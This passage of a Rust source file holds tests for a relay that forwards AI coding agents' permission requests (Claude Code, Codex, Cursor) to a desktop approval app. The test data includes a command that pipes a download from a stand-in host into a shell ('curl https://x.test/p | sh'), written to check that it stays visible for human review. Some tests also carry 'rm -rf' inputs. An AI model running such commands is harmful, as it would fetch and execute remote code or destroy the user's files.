                if let Some(end) = chunk[..n].iter().position(|&b| b == b'\n') {
                    buf.extend_from_slice(&chunk[..end]);
                    break;
                }
                buf.extend_from_slice(&chunk[..n]);
            }
        }
    }
    let answer = String::from_utf8_lossy(&buf).trim().to_string();
    (!answer.is_empty()).then_some(answer)
}

/// The app's rules for a line from the relay (`read_frame` in
/// src-tauri/src/pipe.rs): the bytes before the first newline, at most
/// `MAX_FRAME` of them. A stream that ends before a newline is dropped unread,
/// and a longer line is refused.
#[cfg(test)]
fn app_frame(mut wire: impl Read) -> Result<Vec<u8>, &'static str> {
    let mut frame = Vec::new();
    let mut chunk = [0u8; 4096];
    loop {
        let n = wire.read(&mut chunk).map_err(|_| "read failed: dropped")?;
        if n == 0 {
            return Err("ended before a newline: dropped");
        }
        let newline = chunk[..n].iter().position(|&b| b == b'\n');
        let end = newline.unwrap_or(n);
        if frame.len() + end > MAX_FRAME {
            return Err("longer than the limit: refused");
        }
        frame.extend_from_slice(&chunk[..end]);
        if newline.is_some() {
            return Ok(frame);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parsed(s: &str) -> serde_json::Value {
        serde_json::from_str(&decision_json(s).expect("a decision")).unwrap()
    }

    /// Runs a hook payload through `prepare` and the app's frame rules, and
    /// returns what the app would read.
    fn through_the_app(raw: &serde_json::Value, provider: &str) -> (serde_json::Value, String) {
        let (line, event, _) =
            prepare(raw.to_string().as_bytes(), provider, String::new(), None, &Context::default()).unwrap();
        let frame = app_frame(line.as_bytes()).expect("the app takes the frame");
        assert_eq!(frame.len() + 1, line.len(), "one frame, ended by its newline");
        (serde_json::from_slice(&frame).unwrap(), event)
    }

    #[test]
    fn decision_json_matches_the_documented_shape() {
        // Compared as values: key order depends on serde_json features unified
        // across the workspace, and JSON does not care.
        assert_eq!(
            parsed("allow"),
            serde_json::json!({
                "hookSpecificOutput": { "hookEventName": "PermissionRequest", "decision": { "behavior": "allow" } }
            })
        );
        let deny = parsed("deny");
        let d = &deny["hookSpecificOutput"]["decision"];
        assert_eq!(d["behavior"], "deny");
        assert_eq!(d["interrupt"], false, "a plain deny lets Claude carry on");
        assert!(d["message"].as_str().unwrap().contains("Nobi"));
        assert!(deny.get("continue").is_none());
    }

    #[test]
    fn a_reason_reaches_claude_escaped() {
        let out = parsed(r#"{"behavior":"deny","message":"Bunu yapma \"lütfen\"\u0007 — önce sor"}"#);
        let d = &out["hookSpecificOutput"]["decision"];
        assert_eq!(d["message"], "Bunu yapma \"lütfen\" — önce sor");
        assert_eq!(d["interrupt"], false, "no flag: a plain deny");
        let plain = parsed(r#"{"behavior":"deny","message":"Use the script","interrupt":false,"stop":false}"#);
        assert_eq!(plain["hookSpecificOutput"]["decision"]["interrupt"], false);
        assert!(plain.get("continue").is_none());
    }

    #[test]
    fn deny_and_stop_ends_the_turn() {
        // What the app sends for "Deny and stop".
        let out = parsed(r#"{"behavior":"deny","message":"Dur","interrupt":true,"stop":true}"#);
        assert_eq!(out["hookSpecificOutput"]["decision"]["interrupt"], true);
        assert_eq!(out["continue"], false);
        assert_eq!(out["stopReason"], "Dur");
        // `stop` on an allow is meaningless and ignored.
        assert!(parsed(r#"{"behavior":"allow","stop":false}"#).get("continue").is_none());
    }

    #[test]
    fn cursor_is_told_to_ask_whenever_nobi_gives_no_decision() {
        // Closed, paused, handed back, timed out, or input that could not be read:
        // never a deny that blames an app that may well be running.
        let ask: serde_json::Value =
            serde_json::from_str(&no_decision_json("cursor", "PermissionRequest").unwrap()).unwrap();
        assert_eq!(ask["permission"], "ask");
        let note = ask["user_message"].as_str().unwrap();
        assert!(note.contains("left this request to Cursor") && note.contains("Cursor'a bıraktı"), "{note}");
        assert!(ask.get("agent_message").is_none());
        let prompt: serde_json::Value =
            serde_json::from_str(&no_decision_json("cursor", "UserPromptSubmit").unwrap()).unwrap();
        assert_eq!(prompt, serde_json::json!({ "continue": true }));
        // Display-only events, Claude Code and Codex: silence, and they ask themselves.
        assert!(no_decision_json("cursor", "PostToolUse").is_none());
        assert!(no_decision_json("claude", "PermissionRequest").is_none());
        assert!(no_decision_json("codex", "PermissionRequest").is_none());
        // An answer the relay does not understand is no decision either.
        assert!(cursor_decision_json("PermissionRequest", r#"{"behavior":"ask"}"#).is_none());
        assert!(cursor_decision_json("PermissionRequest", "garbage").is_none());
    }

    #[test]
    fn cursor_events_are_named_like_claude_codes_even_unread() {
        // The command line names the event even when stdin cannot be parsed.
        assert_eq!(event_name("cursor", "beforeShellExecution"), "PermissionRequest");
        assert_eq!(event_name("cursor", "beforeMCPExecution"), "PermissionRequest");
        assert_eq!(event_name("cursor", "beforeSubmitPrompt"), "UserPromptSubmit");
        assert_eq!(event_name("cursor", "afterShellExecution"), "PostToolUse");
        assert_eq!(event_name("cursor", "afterAgentResponse"), "Stop");
        assert_eq!(event_name("cursor", "somethingNew"), "somethingNew");
        assert_eq!(event_name("claude", "beforeShellExecution"), "beforeShellExecution");
        assert_eq!(event_name("codex", "PermissionRequest"), "PermissionRequest");
        // Unparseable input, such as a lone surrogate serde_json refuses.
        let lone = br#"{"hook_event_name":"beforeShellExecution","command":"echo \ud83d"}"#;
        assert!(prepare(lone, "cursor", "beforeShellExecution".into(), None, &Context::default()).is_none());
    }

    #[test]
    fn every_line_the_relay_sends_is_one_frame_the_app_takes() {
        let events = [
            ("claude", serde_json::json!({ "hook_event_name": "SessionStart", "session_id": "s", "cwd": "/w" })),
            (
                "claude",
                serde_json::json!({ "hook_event_name": "UserPromptSubmit", "session_id": "s", "cwd": "/w", "prompt": "çalış\nşimdi" }),
            ),
            (
                "claude",
                serde_json::json!({ "hook_event_name": "PreToolUse", "session_id": "s", "cwd": "/w", "tool_name": "Bash", "tool_input": { "command": "ls" } }),
            ),
            (
                "claude",
                serde_json::json!({ "hook_event_name": "PermissionRequest", "session_id": "s", "cwd": "/w", "tool_name": "Bash", "tool_input": { "command": "a\nb\r\n\"c\"" } }),
            ),
            (
                "claude",
                serde_json::json!({ "hook_event_name": "PostToolUse", "session_id": "s", "cwd": "/w", "tool_name": "Write", "tool_input": { "file_path": "/w/a", "content": "x\ny" } }),
            ),
            (
                "codex",
                serde_json::json!({ "hook_event_name": "PermissionRequest", "session_id": "s", "cwd": "/w", "tool_name": "Bash", "tool_input": { "command": "ls" } }),
            ),
            (
                "cursor",
                serde_json::json!({ "hook_event_name": "beforeShellExecution", "conversation_id": "c", "command": "ls\nrm -rf x", "cwd": "/w" }),
            ),
            (
                "cursor",
                serde_json::json!({ "hook_event_name": "beforeMCPExecution", "conversation_id": "c", "tool_name": "q", "tool_input": "{\"a\":1}" }),
            ),
        ];
        for (provider, raw) in events {
            let (sent, _) = through_the_app(&raw, provider);
            assert!(sent["hook_event_name"].is_string(), "{raw}");
        }
        let status = status_payload(&serde_json::json!({ "session_id": "s", "cwd": "/w" }), "").unwrap();
        assert!(app_frame(status.as_bytes()).is_ok());
        assert!(app_frame(&b"{}"[..]).is_err(), "the rule the bridge once broke");
    }

    #[test]
    fn a_request_too_large_for_one_frame_is_cut_evenly_to_fit() {
        // Nine edits of two 70 KB strings: 1.2 MB after the per-field cap, more
        // than the app reads. Every edit survives, each cut to the same length.
        let edits: Vec<serde_json::Value> = (0..9)
            .map(|i| serde_json::json!({ "old_string": format!("{i}").repeat(70_000), "new_string": "ş".repeat(35_000) }))
            .collect();
        let raw = serde_json::json!({
            "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "/home/dev/proj",
            "tool_name": "MultiEdit", "tool_input": { "file_path": "/home/dev/proj/a.rs", "edits": edits },
        });
        let (sent, event) = through_the_app(&raw, "claude");
        assert_eq!(event, "PermissionRequest");
        assert_eq!(sent[TRUNCATED_FLAG], true, "cut, and the app is told so");
        assert_eq!((sent["session_id"].as_str(), sent["cwd"].as_str()), (Some("s1"), Some("/home/dev/proj")));
        assert_eq!(sent["tool_name"], "MultiEdit");
        assert_eq!(sent["tool_input"]["file_path"], "/home/dev/proj/a.rs");
        let sent_edits = sent["tool_input"]["edits"].as_array().unwrap();
        assert_eq!(sent_edits.len(), 9);
        let olds: Vec<usize> = sent_edits.iter().map(|e| e["old_string"].as_str().unwrap().len()).collect();
        assert!(olds.iter().all(|n| *n == olds[0]), "evenly: {olds:?}");
        assert!(olds[0] > 40_000 && olds[0] < 65_000, "as much as fits: {}", olds[0]);
        assert!(sent_edits.iter().all(|e| e["new_string"].as_str().unwrap().ends_with('…')));
    }

    #[test]
    fn escapes_count_toward_the_frame() {
        // Quotes and control characters take two to six bytes on the wire each:
        // 325 000 bytes of text, under every field cap, are 1.1 MB as JSON.
        let n = 65_000;
        let raw = serde_json::json!({
            "hook_event_name": "PermissionRequest", "session_id": "s", "cwd": "/w", "tool_name": "mcp__x__y",
            "tool_input": {
                "a": "\"".repeat(n), "b": "\u{1}".repeat(n), "c": "\\".repeat(n), "d": "\u{2}".repeat(n), "e": "z".repeat(n),
            },
        });
        assert!(raw.to_string().len() > MAX_FRAME);
        let (sent, _) = through_the_app(&raw, "claude");
        assert_eq!(sent[TRUNCATED_FLAG], true);
        assert_eq!(sent["tool_name"], "mcp__x__y");
        assert!(sent["tool_input"]["e"].as_str().unwrap().len() > 50_000, "as much as fits");
    }

    #[test]
    fn display_only_events_fit_one_frame_too() {
        let edits: Vec<serde_json::Value> = (0..600)
            .map(|_| serde_json::json!({ "old_string": "o".repeat(1_500), "new_string": "n".repeat(1_500) }))
            .collect();
        let raw = serde_json::json!({
            "hook_event_name": "PreToolUse", "session_id": "s", "cwd": "/w",
            "tool_name": "MultiEdit", "tool_input": { "file_path": "/w/f", "edits": edits },
        });
        let (sent, event) = through_the_app(&raw, "claude");
        assert_eq!(event, "PreToolUse");
        assert_eq!(sent["tool_input"]["edits"].as_array().unwrap().len(), 600);
        assert_eq!(sent[TRUNCATED_FLAG], true);
    }

    #[test]
    fn a_request_that_fits_is_left_alone() {
        let raw = serde_json::json!({
            "hook_event_name": "PermissionRequest", "session_id": "s", "cwd": "/w", "tool_name": "Write",
            "tool_input": { "file_path": "/w/big.txt", "content": "ç".repeat(30_000) },
        });
        let (sent, _) = through_the_app(&raw, "claude");
        assert!(sent.get(TRUNCATED_FLAG).is_none());
        assert_eq!(sent["tool_input"]["content"].as_str().unwrap().chars().count(), 30_000);
        // Exactly at the limit is still one frame; one byte more is not.
        let mut at_limit = vec![b'x'; MAX_FRAME];
        at_limit.push(b'\n');
        assert_eq!(app_frame(at_limit.as_slice()).unwrap().len(), MAX_FRAME);
        at_limit.insert(0, b'x');
        assert!(app_frame(at_limit.as_slice()).is_err());
    }

    #[test]
    fn a_shape_too_large_to_cut_goes_whole_with_what_it_is_up_front() {
        // No string to cut: the numbers alone are over a megabyte. The app
        // refuses it and records it from the line's start, so that start names
        // the event, the session, the folder and the tool.
        let raw = serde_json::json!({
            "session_id": "s1", "cwd": "/w", "hook_event_name": "PermissionRequest",
            "tool_input": { "rows": vec![12345; 200_000] }, "tool_name": "mcp__db__insert",
        });
        let (line, _, _) =
            prepare(raw.to_string().as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert!(line.len() > MAX_FRAME + 1);
        assert!(app_frame(line.as_bytes()).is_err(), "refused by the app");
        assert!(
            line.starts_with(
                r#"{"hook_event_name":"PermissionRequest","session_id":"s1","cwd":"/w","tool_name":"mcp__db__insert","#
            ),
            "{}",
            &line[..120]
        );
        let whole: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(whole["tool_input"]["rows"].as_array().unwrap().len(), 200_000, "never cut silently");
    }

    #[test]
    fn the_wire_order_changes_nothing_but_the_order() {
        let raw = serde_json::json!({
            "z": [1, { "b": "x", "a": null }], "tool_name": "Bash", "cwd": "C:\\w \"q\"", "hook_event_name": "Stop",
            "session_id": "s", "agent_name": "Codex", "a": true,
        });
        let line = to_json(&raw);
        assert_eq!(serde_json::from_str::<serde_json::Value>(&line).unwrap(), raw);
        assert!(line.starts_with(
            r#"{"hook_event_name":"Stop","session_id":"s","cwd":"C:\\w \"q\"","tool_name":"Bash","agent_name":"Codex","#
        ));
        assert_eq!(to_json(&serde_json::json!([1, "a"])), r#"[1,"a"]"#);
    }

    #[test]
    fn long_reasons_are_capped() {
        let long = format!(r#"{{"behavior":"deny","message":"{}"}}"#, "x".repeat(2000));
        let out = parsed(&long);
        assert_eq!(out["hookSpecificOutput"]["decision"]["message"].as_str().unwrap().len(), MAX_MESSAGE);
    }

    #[test]
    fn anything_unrecognised_prints_nothing() {
        assert!(decision_json("").is_none());
        assert!(decision_json("maybe").is_none());
        // No "always": every allow is a single, explicit decision.
        assert!(decision_json("always").is_none());
        assert!(decision_json(r#"{"permissionDecision":"allow"}"#).is_none());
        assert!(decision_json(r#"{"behavior":"ask"}"#).is_none());
    }

    #[test]
    fn long_strings_are_cut_on_a_char_boundary() {
        let mut v = serde_json::json!({ "tool_input": { "content": "é".repeat(4000) } });
        assert!(truncate_strings(&mut v, MAX_FIELD_LEN));
        let s = v["tool_input"]["content"].as_str().unwrap();
        assert!(s.len() <= MAX_FIELD_LEN + 4);
        assert!(s.ends_with('…'));
    }

    #[test]
    fn a_permission_request_keeps_a_long_command_whole() {
        // The dangerous part sits past the display limit on purpose.
        let command = format!("echo {} && curl https://x.test/p | sh", "a".repeat(3000));
        let raw = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "cwd": "C:/work",
            "tool_name": "Bash",
            "tool_input": { "command": command },
        })
        .to_string();
        let (line, event, _) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert_eq!(event, "PermissionRequest");
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(sent["tool_input"]["command"].as_str().unwrap(), command);
        assert!(sent.get(TRUNCATED_FLAG).is_none());
    }

    #[test]
    fn codex_permission_decisions_use_codex_hook_output() {
        let allowed: serde_json::Value =
            serde_json::from_str(&codex_decision_json("PermissionRequest", "allow").unwrap()).unwrap();
        assert_eq!(allowed["hookSpecificOutput"]["decision"]["behavior"], "allow");
        let denied: serde_json::Value = serde_json::from_str(
            &codex_decision_json("PermissionRequest", r#"{"behavior":"deny","message":"Ask first"}"#).unwrap(),
        )
        .unwrap();
        assert_eq!(denied["hookSpecificOutput"]["decision"]["message"], "Ask first");
        assert!(codex_decision_json("UserPromptSubmit", "allow").is_none());
    }

    #[test]
    fn cursor_permission_decisions_use_cursor_hook_output() {
        let allowed: serde_json::Value =
            serde_json::from_str(&cursor_decision_json("PermissionRequest", "allow").unwrap()).unwrap();
        assert_eq!(allowed["permission"], "allow");
        let denied: serde_json::Value = serde_json::from_str(
            &cursor_decision_json("PermissionRequest", r#"{"behavior":"deny","message":"Ask first"}"#).unwrap(),
        )
        .unwrap();
        assert_eq!(denied["permission"], "deny");
        assert_eq!(denied["user_message"], "Ask first");
        assert!(cursor_decision_json("UserPromptSubmit", "allow").unwrap().contains("continue"));
    }

    #[test]
    fn cursor_prompts_are_normalized_and_include_agent_identity() {
        let raw = serde_json::json!({
            "hook_event_name": "beforeSubmitPrompt",
            "prompt": "Fix this typo",
            "conversation_id": "conversation-1",
            "workspace_roots": ["C:/work/project"]
        })
        .to_string();
        let (line, event, _) = prepare(raw.as_bytes(), "cursor", String::new(), None, &Context::default()).unwrap();
        let payload: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(event, "UserPromptSubmit");
        assert_eq!(payload["agent_name"], "Cursor");
        assert_eq!(payload["session_id"], "conversation-1");
        assert_eq!(payload["cwd"], "C:/work/project");
        assert_eq!(payload["prompt"], "Fix this typo");
    }

    #[test]
    fn a_cut_permission_request_is_flagged() {
        let raw = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "cwd": "C:/work",
            "tool_input": { "command": "x".repeat(MAX_APPROVAL_FIELD_LEN + 10) },
        })
        .to_string();
        let (line, _, _) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(sent[TRUNCATED_FLAG], serde_json::Value::Bool(true));
    }

    #[test]
    fn display_only_events_are_still_capped() {
        let raw = serde_json::json!({
            "hook_event_name": "PreToolUse",
            "cwd": "C:/work",
            "tool_input": { "command": "y".repeat(5000) },
        })
        .to_string();
        let (line, _, _) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert!(sent["tool_input"]["command"].as_str().unwrap().len() <= MAX_FIELD_LEN + 4);
    }

    #[test]
    fn the_process_chain_is_attached_when_given() {
        let raw = br#"{"hook_event_name":"SessionStart","cwd":"C:/w"}"#;
        let chain = vec![(10, "claude.exe".to_string()), (9, "pwsh.exe".to_string())];
        let (line, _, _) = prepare(raw, "claude", String::new(), Some(chain), &Context::default()).unwrap();
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(sent["nobi_parents"][0]["name"], "claude.exe");
        assert_eq!(sent["nobi_parents"][1]["pid"], 9);
    }

    #[test]
    fn the_real_chain_can_be_read() {
        // cargo test runs under cargo, so there is always a parent.
        let chain = os::ancestors(12);
        assert!(!chain.is_empty());
        assert!(chain.iter().all(|(pid, name)| *pid > 1 && !name.is_empty()));
    }

    #[test]
    fn a_bom_and_argv_event_are_handled() {
        let mut raw = vec![0xEF, 0xBB, 0xBF];
        raw.extend_from_slice(br#"{"cwd":"C:/w"}"#);
        let (_, event, _) = prepare(&raw, "claude", "Stop".into(), None, &Context::default()).unwrap();
        assert_eq!(event, "Stop");
    }

    #[test]
    fn the_desktop_app_gates_only_tools_that_would_ask() {
        let d = DESKTOP_ENTRYPOINT;
        assert!(desktop_gate(d, "Bash", "default"));
        assert!(desktop_gate(d, "Write", ""));
        assert!(desktop_gate(d, "mcp__github__create_issue", "default"));
        assert!(desktop_gate(d, "Bash", "acceptEdits"), "acceptEdits still asks for commands");
        // Reads never ask, so they never wait.
        assert!(!desktop_gate(d, "Read", "default"));
        assert!(!desktop_gate(d, "Grep", "default"));
        // The user chose not to be asked.
        assert!(!desktop_gate(d, "Edit", "acceptEdits"));
        assert!(!desktop_gate(d, "Bash", "bypassPermissions"));
        assert!(!desktop_gate(d, "Bash", "dontAsk"));
        // The CLI and VS Code have PermissionRequest; their PreToolUse never waits.
        assert!(!desktop_gate("cli", "Bash", "default"));
        assert!(!desktop_gate("claude-vscode", "Bash", "default"));
        assert!(!desktop_gate("", "Bash", "default"));
    }

    #[test]
    fn a_desktop_pre_tool_use_travels_as_a_permission_request() {
        let raw = serde_json::json!({
            "hook_event_name": "PreToolUse",
            "session_id": "s1",
            "cwd": "C:/work",
            "entrypoint": DESKTOP_ENTRYPOINT,
            "permission_mode": "default",
            "tool_name": "Bash",
            "tool_input": { "command": "rm -rf build" },
        })
        .to_string();
        let (line, event, gated) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert!(gated);
        assert_eq!(event, "PermissionRequest");
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(sent["hook_event_name"], "PermissionRequest");
        assert_eq!(sent["nobi_via"], "PreToolUse");
        assert_eq!(sent["tool_input"]["command"], "rm -rf build");

        // The same event from the terminal is only displayed.
        let cli = raw.replace(DESKTOP_ENTRYPOINT, "cli");
        let (_, event, gated) = prepare(cli.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert!(!gated);
        assert_eq!(event, "PreToolUse");
    }

    #[test]
    fn the_session_s_surroundings_come_from_the_context_never_the_environment() {
        // relay#0: whatever CLAUDE_CODE_ENTRYPOINT the test run itself has (the
        // Claude desktop app's Code tab sets claude-desktop), a PreToolUse is
        // gated by the context handed in, and nothing else.
        let raw = serde_json::json!({
            "hook_event_name": "PreToolUse", "session_id": "s", "cwd": "/w", "permission_mode": "default",
            "tool_name": "Bash", "tool_input": { "command": "rm -rf build" },
        })
        .to_string();
        let (line, event, gated) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert_eq!((event.as_str(), gated), ("PreToolUse", false));
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(sent["entrypoint"], "");
        let desktop = Context {
            entrypoint: DESKTOP_ENTRYPOINT.into(),
            term_program: "vscode".into(),
            cwd: Some("/elsewhere".into()),
            ..Context::default()
        };
        let (line, event, gated) = prepare(raw.as_bytes(), "claude", String::new(), None, &desktop).unwrap();
        assert_eq!((event.as_str(), gated), ("PermissionRequest", true));
        let sent: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(
            (sent["entrypoint"].as_str(), sent["term_program"].as_str()),
            (Some("claude-desktop"), Some("vscode"))
        );
        assert_eq!(sent["cwd"], "/w", "the event's own folder wins");
        // An event that names no folder takes the context's.
        let bare = br#"{"hook_event_name":"Stop","session_id":"s"}"#;
        let (line, _, _) = prepare(bare, "claude", String::new(), None, &desktop).unwrap();
        assert!(line.contains(r#""cwd":"/elsewhere""#), "{line}");
        // What the event itself says about its entrypoint is kept.
        let (_, _, gated) = prepare(
            raw.replace("\"permission_mode\"", "\"entrypoint\":\"cli\",\"permission_mode\"").as_bytes(),
            "claude",
            String::new(),
            None,
            &desktop,
        )
        .unwrap();
        assert!(!gated, "the event's own entrypoint wins");
    }

    #[test]
    fn the_entrypoint_goes_up_front_for_a_frame_too_large_to_read() {
        // The app records a refused frame from its first megabyte: it must see
        // what would ask instead (the Claude app, not the terminal).
        let raw = serde_json::json!({
            "session_id": "s1", "cwd": "/w", "hook_event_name": "PermissionRequest",
            "tool_input": { "rows": vec![12345; 200_000] }, "tool_name": "mcp__db__insert",
        });
        let desktop = Context { entrypoint: DESKTOP_ENTRYPOINT.into(), ..Context::default() };
        let (line, _, _) = prepare(raw.to_string().as_bytes(), "claude", String::new(), None, &desktop).unwrap();
        assert!(line.len() > MAX_FRAME, "too large: the app refuses it");
        let head = &line[..200];
        assert!(head.contains(r#""entrypoint":"claude-desktop""#), "{head}");
    }

    #[test]
    fn deny_and_stop_reaches_codex_and_cursor_as_a_plain_deny() {
        // relay#1: neither host can be stopped from a hook. Codex fails a hook
        // answer that sets `interrupt`, and Cursor's permission answer has no
        // field to end the turn; both get the deny and its words, nothing more —
        // whatever an older app sends.
        let stop = r#"{"behavior":"deny","message":"Stopped by the user through Nobi.","interrupt":true,"stop":true}"#;
        let codex: serde_json::Value =
            serde_json::from_str(&codex_decision_json("PermissionRequest", stop).unwrap()).unwrap();
        assert_eq!(
            codex,
            serde_json::json!({ "hookSpecificOutput": { "hookEventName": "PermissionRequest",
                "decision": { "behavior": "deny", "message": "Stopped by the user through Nobi." } } })
        );
        let cursor: serde_json::Value =
            serde_json::from_str(&cursor_decision_json("PermissionRequest", stop).unwrap()).unwrap();
        let keys: Vec<&str> = cursor.as_object().unwrap().keys().map(String::as_str).collect();
        assert_eq!(cursor["permission"], "deny");
        assert!(keys.iter().all(|k| ["permission", "user_message", "agent_message"].contains(k)), "{keys:?}");
        // Claude Code, the one host that can be stopped, is.
        let claude: serde_json::Value = serde_json::from_str(&decision_json(stop).unwrap()).unwrap();
        assert_eq!(claude["continue"], false);
    }

    #[test]
    fn pre_tool_use_decisions_match_the_documented_shape() {
        let allow: serde_json::Value = serde_json::from_str(&pre_tool_use_json("allow").unwrap()).unwrap();
        assert_eq!(allow["hookSpecificOutput"]["hookEventName"], "PreToolUse");
        assert_eq!(allow["hookSpecificOutput"]["permissionDecision"], "allow");
        let deny: serde_json::Value =
            serde_json::from_str(&pre_tool_use_json(r#"{"behavior":"deny","message":"Önce sor"}"#).unwrap()).unwrap();
        assert_eq!(deny["hookSpecificOutput"]["permissionDecision"], "deny");
        assert_eq!(deny["hookSpecificOutput"]["permissionDecisionReason"], "Önce sor");
        assert!(deny.get("continue").is_none());
        let stop: serde_json::Value =
            serde_json::from_str(&pre_tool_use_json(r#"{"behavior":"deny","stop":true}"#).unwrap()).unwrap();
        assert_eq!(stop["continue"], false);
        // Anything unrecognised prints nothing: the app's own dialog takes over.
        assert!(pre_tool_use_json("maybe").is_none());
        assert!(pre_tool_use_json(r#"{"behavior":"ask"}"#).is_none());
    }

    #[test]
    fn questions_and_plans_wait_everywhere_but_only_for_claude() {
        let raw = serde_json::json!({
            "hook_event_name": "PreToolUse",
            "session_id": "s1",
            "cwd": "/w",
            "entrypoint": "cli",
            "tool_name": "AskUserQuestion",
            "tool_input": { "questions": [{ "question": "Which?", "header": "H", "options": [{ "label": "A" }] }] },
        })
        .to_string();
        let (line, event, gated) = prepare(raw.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert!(gated);
        assert_eq!(event, "PermissionRequest");
        assert!(line.contains("\"nobi_via\":\"PreToolUse\""));
        let plan = raw.replace("AskUserQuestion", "ExitPlanMode");
        assert!(prepare(plan.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap().2);
        // Other tools in the terminal are only displayed.
        let read = raw.replace("AskUserQuestion", "Read");
        assert!(!prepare(read.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap().2);
    }

    #[test]
    fn answers_travel_in_updated_input() {
        let answer = r#"{"behavior":"allow","updatedInput":{"questions":[],"answers":{"Which?":"A"}}}"#;
        let pre: serde_json::Value = serde_json::from_str(&pre_tool_use_json(answer).unwrap()).unwrap();
        assert_eq!(pre["hookSpecificOutput"]["permissionDecision"], "allow");
        assert_eq!(pre["hookSpecificOutput"]["updatedInput"]["answers"]["Which?"], "A");
        let perm: serde_json::Value = serde_json::from_str(&decision_json(answer).unwrap()).unwrap();
        assert_eq!(perm["hookSpecificOutput"]["decision"]["updatedInput"]["answers"]["Which?"], "A");
        // A plain allow carries no input.
        let plain: serde_json::Value = serde_json::from_str(&pre_tool_use_json("allow").unwrap()).unwrap();
        assert!(plain["hookSpecificOutput"].get("updatedInput").is_none());
        // Plan feedback keeps Claude going: no interrupt.
        let feedback: serde_json::Value = serde_json::from_str(
            &decision_json(r#"{"behavior":"deny","message":"Add tests","interrupt":false}"#).unwrap(),
        )
        .unwrap();
        assert_eq!(feedback["hookSpecificOutput"]["decision"]["interrupt"], false);
        assert_eq!(feedback["hookSpecificOutput"]["decision"]["message"], "Add tests");
    }

    #[test]
    fn file_changes_count_lines_from_the_patch_or_the_input() {
        let from_patch = serde_json::json!({
            "hook_event_name": "PostToolUse", "session_id": "s", "cwd": "/w", "tool_name": "Edit",
            "tool_input": { "file_path": "/w/a.rs", "old_string": "x", "new_string": "y" },
            "tool_response": { "structuredPatch": [{ "oldStart": 3, "oldLines": 2, "newStart": 3, "newLines": 3,
                "lines": [" keep", "-old", "+new", "+more"] }] },
        })
        .to_string();
        let (line, _, _) = prepare(from_patch.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        let v: serde_json::Value = serde_json::from_str(&line).unwrap();
        let c = &v["nobi_change"];
        assert_eq!(c["file"], "/w/a.rs");
        assert_eq!((c["added"].as_u64(), c["removed"].as_u64()), (Some(2), Some(1)));
        assert!(c["diff"].as_str().unwrap().starts_with("@@ -3,2 +3,3 @@"));
        assert!(v.get("tool_response").is_none(), "the response itself is still dropped");

        let from_input = serde_json::json!({
            "hook_event_name": "PostToolUse", "session_id": "s", "cwd": "/w", "tool_name": "Write",
            "tool_input": { "file_path": "/w/new.md", "content": "a\nb\nc" },
            "tool_response": { "type": "create", "filePath": "/w/new.md" },
        })
        .to_string();
        let (line, _, _) = prepare(from_input.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        let v: serde_json::Value = serde_json::from_str(&line).unwrap();
        assert_eq!(v["nobi_change"]["added"], 3);
        assert_eq!(v["nobi_change"]["created"], true);

        let read = from_input.replace("\"Write\"", "\"Read\"");
        let (line, _, _) = prepare(read.as_bytes(), "claude", String::new(), None, &Context::default()).unwrap();
        assert!(!line.contains("nobi_change"));
    }

    #[test]
    fn the_status_line_reports_what_it_was_given() {
        let data = serde_json::json!({
            "session_id": "s1",
            "model": { "display_name": "Opus" },
            "workspace": { "current_dir": "/w" },
            "context_window": { "used_percentage": 23.4 },
            "cost": { "total_cost_usd": 0.5 },
            "rate_limits": { "five_hour": { "used_percentage": 41.0, "resets_at": 1700000000 } },
        });
        assert_eq!(status_text(&data), "Nobi · Opus · ctx 23% · 5h 41%");
        let sent: serde_json::Value = serde_json::from_str(&status_payload(&data, "cli").unwrap()).unwrap();
        assert_eq!(sent["hook_event_name"], "StatusLine");
        assert_eq!(sent["entrypoint"], "cli");
        assert_eq!(sent["five_hour"]["used"], 41.0);
        assert!(sent["seven_day"]["used"].is_null());
        assert_eq!(status_text(&serde_json::json!({})), "Nobi");
        assert!(status_payload(&serde_json::json!({}), "").is_none());
    }
}
